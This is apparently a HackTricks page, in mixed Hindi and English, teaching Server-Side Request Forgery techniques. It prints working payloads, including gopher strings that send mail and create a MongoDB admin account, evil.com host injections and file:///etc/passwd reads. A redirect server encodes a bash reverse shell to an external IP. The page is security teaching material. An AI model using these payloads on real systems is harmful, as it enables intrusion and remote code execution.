# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

एक **Server-side Request Forgery (SSRF)** vulnerability तब होती है जब कोई आक्रमणकारी किसी **server-side application** को इस तरह प्रभावित करता है कि वह उसकी चुनी हुई डोमेन पर **HTTP requests** भेजे। यह vulnerability सर्वर को आक्रमणकारी द्वारा निर्देशित arbitrary external requests के लिए उजागर कर देती है।

## Capture SSRF

सबसे पहले आपको अपनी तरफ से उत्पन्न किए गए SSRF interaction को capture करना होगा। HTTP या DNS interaction कैप्चर करने के लिए आप निम्न tools का उपयोग कर सकते हैं:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

अक्सर आप पाएँगे कि SSRF केवल कुछ निश्चित **whitelisted domains** या URL पर ही काम करता है। नीचे दिए गए पृष्ठ में उन whitelist को bypass करने के प्रयास के लिए तकनीकों का एक संग्रह दिया गया है:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via Open Redirect

यदि सर्वर ठीक से protected है तो आप वेब पेज के अंदर मौजूद किसी Open Redirect का एक्सप्लॉइट करके सभी प्रतिबंधों को bypass कर सकते हैं। क्योंकि वेबपेज उसी domain के लिए **SSRF to the same domain** की अनुमति देगा और शायद **follow redirects** भी करेगा, आप Open Redirect का उपयोग कर सकते हैं ताकि सर्वर किसी भी internal resource तक पहुँच सके।\
Read more here: [https://portswigger.net/web-security/ssrf]

## प्रोटोकॉल

- **file://**
- URL scheme `file://` का उल्लेख किया गया है, जो सीधे `/etc/passwd` की ओर इशारा करता है: `file:///etc/passwd`
- **dict://**
- DICT URL scheme का उपयोग DICT protocol के माध्यम से definitions या शब्द सूचियों तक पहुँचने के लिए किया जाता है। दिया गया उदाहरण एक URL दिखाता है जो किसी विशेष word, database और entry नंबर को लक्षित करता है, तथा एक PHP script का उदाहरण भी है जो attacker‑provided credentials का उपयोग करके DICT server से कनेक्ट करने के लिए दुरुपयोग किया जा सकता है: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Secure shell पर secure file transfer के लिए इस्तेमाल होने वाले protocol के रूप में पहचाना गया है; एक उदाहरण दिखाता है कि कैसे एक PHP script का दुरुपयोग करके एक malicious SFTP server से कनेक्ट किया जा सकता है: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, जो UDP पर काम करता है, का उल्लेख है और एक PHP script के उदाहरण के साथ दिखाया गया है जो TFTP server को request भेजने के लिए डिज़ाइन किया गया है। एक TFTP request 'generic.com' पर port '12346' पर फाइल 'TESTUDPPACKET' के लिए किया जाता है: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- यह भाग Lightweight Directory Access Protocol को कवर करता है, और IP नेटवर्क पर distributed directory information services के प्रबंधन और एक्सेस के उपयोग पर जोर देता है। localhost पर एक LDAP server के साथ इंटरैक्ट करने का उदाहरण: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- SSRF vulnerabilities का उपयोग करके localhost पर SMTP सेवाओं के साथ इंटरैक्ट करने के तरीके का वर्णन किया गया है, जिसमें internal domain नामों का खुलासा करने और उस जानकारी पर आधारित आगे की जाँच करने के चरण शामिल हैं।
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- यदि SSRF **curl** द्वारा निष्पादित किया जाता है, तो curl में [**URL globbing**](https://everything.curl.dev/cmdline/globbing) नामक एक फीचर है जो WAFs को bypass करने में उपयोगी हो सकता है। उदाहरण के लिए, इस [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) में आप **path traversal via `file` protocol** का यह उदाहरण पा सकते हैं:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher प्रोटोकॉल की वह क्षमता कि यह सर्वर से संचार के लिए **IP, port and bytes** निर्दिष्ट कर सकता है, साथ ही Gopherus और remote-method-guesser जैसे टूल जिनसे payloads तैयार किए जा सकते हैं। दो अलग उपयोग उदाहरण के साथ दिखाए गए हैं:

### Gopher://

Using this protocol you can specify the **IP, port and bytes** you want the server to **भेजे**. Then, you can basically exploit a SSRF to **किसी भी TCP server के साथ संवाद** कर सकते हैं (but you need to know how to talk to the service first).\
Fortunately, you can use [Gopherus](https://github.com/tarunkant/Gopherus) to create payloads for several services. Additionally, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) can be used to create _gopher_ payloads for _Java RMI_ services.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect 1337 पर**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin, password=admin123 और permission=administrator वाले उपयोगकर्ता बनाएँ
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF Referrer header के माध्यम से और अन्य

एनालिटिक्स सॉफ़्टवेयर सर्वर्स पर अक्सर incoming links को ट्रैक करने के लिए Referrer header को लॉग करता है, एक ऐसा अभ्यास जो अनजाने में applications को Server-Side Request Forgery (SSRF) vulnerabilities के लिए उजागर कर देता है। ऐसा इसलिए होता है क्योंकि ऐसा सॉफ़्टवेयर Referrer header में दिए गए external URLs पर जाकर रेफ़रल साइट की सामग्री का विश्लेषण कर सकता है। इन कमजोरियों का पता लगाने के लिए Burp Suite plugin "**Collaborator Everywhere**" की सलाह दी जाती है, जो analytics tools द्वारा Referer header को प्रोसेस करने के तरीके का लाभ उठाकर संभावित SSRF attack surfaces की पहचान करती है।

## SSRF via SNI data from certificate

एक गलत कॉन्फ़िगरेशन जो किसी भी backend से कनेक्शन को साधारण सेटअप के माध्यम से सक्षम कर सकता है, नीचे एक उदाहरण Nginx configuration में दिखाया गया है:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
इस कॉन्फ़िगरेशन में, Server Name Indication (SNI) फ़ील्ड का मान सीधे backend के पते के रूप में उपयोग किया जाता है। यह सेटअप Server-Side Request Forgery (SSRF) के प्रति एक भेद्यता खोलता है, जिसे केवल SNI फ़ील्ड में इच्छित IP पता या डोमेन नाम निर्दिष्ट करके शोषित किया जा सकता है। नीचे `openssl` कमांड का उपयोग करके किसी मनमाने backend, जैसे कि `internal.host.com`, से कनेक्शन जबरन करने का एक उदाहरण दिया गया है:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF के माध्यम से TLS AIA CA Issuers (Java mTLS)

कुछ TLS stacks peer certificate के अंदर मौजूद **Authority Information Access (AIA) → CA Issuers** URI का उपयोग करके missing intermediate CAs को auto-download कर लेते हैं। **Java** में, mTLS service चलाते समय `-Dcom.sun.security.enableAIAcaIssuers=true` सक्षम करने पर server client certificate से attacker-controlled URIs को **हैंडशेक के दौरान** dereference कर देता है, HTTP लॉजिक चलने से पहले।

- **Requirements**: mTLS enabled, Java AIA fetching enabled, attacker client cert के साथ crafted AIA CA Issuers URI प्रस्तुत कर सकता है।
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Java certpath debug output में `CertStore URI:http://localhost:8080` दिखता है, और `nc` outbound fetch में `-Dhttp.agent` से नियंत्रित `User-Agent` के साथ HTTP request कैप्चर कर लेता है, जो certificate validation के दौरान SSRF को प्रमाणित करता है।
- **DoS via file://**: AIA CA Issuers को `file:///dev/urandom` पर सेट करने से Unix-like hosts पर Java इसे CertStore मानकर अनिश्चित मात्रा में random bytes पढ़ता है, एक CPU core को व्यस्त रखता है और क्लाइंट disconnect के बाद भी subsequent connections को ब्लॉक कर देता है।

## SSRF के माध्यम से CSS Pre-Processors

LESS एक लोकप्रिय CSS pre-processor है जो variables, mixins, functions और शक्तिशाली `@import` directive जोड़ता है। compilation के दौरान LESS engine `@import` statements में refer किए गए resources को **fetch** करता है और जब `(inline)` option उपयोग किया जाता है तो उनके contents को resulting CSS में embed ("inline") कर देता है।

Check how to exploit it in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF Command Injection के साथ

एक payload आज़माना फायदेमंद हो सकता है, जैसे: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

यदि वेब पेज स्वचालित रूप से आपने दी गई कुछ जानकारी के साथ PDF बना रहा है, तो आप **ऐसा JS डाल सकते हैं जो PDF creator द्वारा** खुद PDF बनाते समय execute होगा (server पर) और आप SSRF का दुरुपयोग कर पाएंगे। [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF से DoS तक

कई sessions बनाकर और उन sessions से SSRF का उपयोग कर भारी फाइलें डाउनलोड करके DoS की कोशिश करें।

## SSRF PHP फ़ंक्शन

कमजोर PHP और यहां तक कि Wordpress फ़ंक्शन्स के लिए निम्न पृष्ठ देखें:

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF को Gopher पर Redirect करना

कुछ exploitations में आपको **redirect response भेजना** पड़ सकता है (संभवतः किसी अलग protocol जैसे gopher का उपयोग करने के लिए)। यहां अलग-अलग python codes हैं जो redirect के साथ respond करते हैं:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## SSRF के लिए गलत कॉन्फ़िगर किए गए proxies

Tricks [**इस पोस्ट से**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy vulnerable code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask आरंभिक वर्ण के रूप में **`@`** का उपयोग करने की अनुमति देता है, जिससे **initial host name the username** बनाया जा सकता है और एक नया host inject किया जा सकता है। Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

कमजोर कोड:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

यह पता चला कि किसी अनुरोध के **पाथ की शुरुआत** वर्ण **`;`** से की जा सकती है, जिससे बाद में **`@`** का उपयोग करके एक नया host इंजेक्ट करके एक्सेस किया जा सकता है। आक्रमण अनुरोध:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>कमजोर PHP कोड</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP URL के path में **char `*` को path में slash से पहले उपयोग करने** की अनुमति देता है, हालांकि इसमें अन्य सीमाएँ भी हैं जैसे कि इसे केवल root pathname `/` के लिए ही इस्तेमाल किया जा सकता है और पहले slash से पहले dots `.` की अनुमति नहीं है, इसलिए उदाहरण के लिए dotless-hex encoded IP address का उपयोग करना आवश्यक है:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

यदि आप लोकल IP से कंटेंट को exfiltrate करने में **समस्याएँ** का सामना कर रहे हैं क्योंकि **CORS/SOP**, तो **DNS Rebidding** उस सीमा को bypass करने के लिए उपयोग किया जा सकता है:

{{#ref}}
../cors-bypass.md
{{#endref}}

### ऑटोमेटेड DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) एक टूल है जो [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks करने के लिए उपयोग होता है। इसमें attack server के DNS नाम के IP को target मशीन के IP पर rebind करने और target मशीन पर vulnerable सॉफ़्टवेयर का exploit करने के लिए attack payloads सर्व करने के आवश्यक components शामिल हैं।

इसके अलावा **publicly running server** को भी देखें: [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. यूज़र/बॉट से उस **domain** को **access** करने के लिए कहें जो **attacker** के नियंत्रण में हो।
2. उस **DNS** की **TTL** को **0** सेकंड रखें (ताकि victim जल्द ही domain के IP को फिर से चेक करे)।
3. victim और attacker के domain के बीच एक **TLS connection** बनती है। attacker **payload** को **Session ID या Session Ticket** के अंदर डाल देता है।
4. वह **domain** अपने ऊपर लगातार redirect का एक **infinite loop** शुरू कर देगा। इसका मकसद यह है कि user/bot उस domain को तब तक access करता रहे जब तक वह domain की **DNS request** फिर से नहीं करता।
5. DNS request में अब एक **private IP** पता दिया जाता है (उदाहरण के लिए 127.0.0.1)।
6. user/bot TLS connection को **reestablish** करने की कोशिश करेगा और इसके लिए वह **Session** ID/Ticket ID भेजेगा (जिसमें attacker का **payload** रखा गया था)। तो बधाई — आपने user/bot को खुद पर हमला करने के लिए बोला।

ध्यान दें कि इस attack के दौरान, यदि आप localhost:11211 (_memcache_) को attack करना चाहते हैं तो आपको victim को initial connection www.attacker.com:11211 से स्थापित कराना होगा (पोर्ट हमेशा समान होना चाहिए)।\
इस attack को करने के लिए आप यह टूल उपयोग कर सकते हैं: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
अधिक जानकारी के लिए उस टॉक को देखें जहाँ यह attack समझाया गया है: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

एक blind SSRF और एक non-blind SSRF में अंतर यह है कि blind में आप SSRF request के response को नहीं देख पाते। इसलिए exploit करना अधिक मुश्किल होता है क्योंकि आप केवल अच्छी तरह से जाने हुए vulnerabilities का ही प्रयोग कर पाएंगे।

### समय-आधारित SSRF

सर्वर के responses के **time** की जाँच करके यह जाना जा सकता है कि कोई resource मौजूद है या नहीं (शायद मौजूद resource तक पहुँचने में अधिक समय लगे बनिस्बत उस resource के जो मौजूद नहीं है)।

### Blind से status codes का पूर्ण दुरुपयोग

इस [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/) के अनुसार, कुछ blind SSRF इसीलिए हो सकती हैं क्योंकि लक्षित URL भले ही 200 status code लौटाए (जैसे AWS metadata), वह data सही ढंग से formatted नहीं होता और इसलिए ऐप उसे दिखाने से इनकार कर सकती है।

हालाँकि, यह पाया गया कि SSRF में 305 से 309 तक कुछ redirect responses भेजने पर एप्लिकेशन इन redirects को follow करते हुए एक error mode में प्रवेश कर सकती है, जहाँ वह data के format की जाँच नहीं करेगी और उसे बस print कर दे सकती है।

इसे exploit करने के लिए उपयोग किया गया python server निम्नलिखित है:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**कदम:**
- पहले 302 ऐप को फॉलो करना शुरू करवा देता है।
- फिर यह 305 → 306 → 307 → 308 → 309 → 310 प्राप्त करता है।
- 5वें अजीब कोड के बाद PoC आखिरकार 302 → 169.254.169.254 → 200 OK लौटाता है।

**टारगेट के अंदर क्या होता है:**
- libcurl स्वयं 305–310 का पालन करता है; यह अज्ञात कोड्स को "follow" के रूप में सामान्यीकृत कर देता है।
- N अजीब redirects (यहाँ ≥ 5) के बाद एप्लिकेशन के अपने wrapper ने "कुछ गड़बड़ है" का फैसला किया और debugging के लिए बने error mode में स्विच कर दिया।
- उस mode में यह पूरी redirect chain और अंतिम body को बाहर के caller को dump कर देता है।
- परिणाम: attacker हर header + metadata JSON देख लेता है, mission accomplished।

ध्यान दें कि यह उन status codes को leak करने के लिए रोचक है जिन्हें आप पहले leak नहीं कर पाते थे (जैसे 200)। हालाँकि, अगर किसी तरह आप response का status code भी चुन सकें (कल्पना कीजिए कि आप तय कर सकते हैं कि AWS metadata 500 status code के साथ जवाब दे), **कुछ status codes सीधे response की सामग्री को leak कर सकते हैं।**

### HTML-to-PDF renderers को blind SSRF gadgets के रूप में

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) PDF render करते समय attacker-controlled HTML में मौजूद किसी भी URLs को स्वतः fetch कर लेंगे। Each `<img>` or `<link rel="stylesheet">` attribute server-side पर cURL, `getimagesize()`, या `file_get_contents()` के जरिए resolve किया जाता है, इसलिए आप PDF worker को internal hosts को probe करने के लिए चला सकते हैं भले ही कोई HTTP response आपको reflect न हो।
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
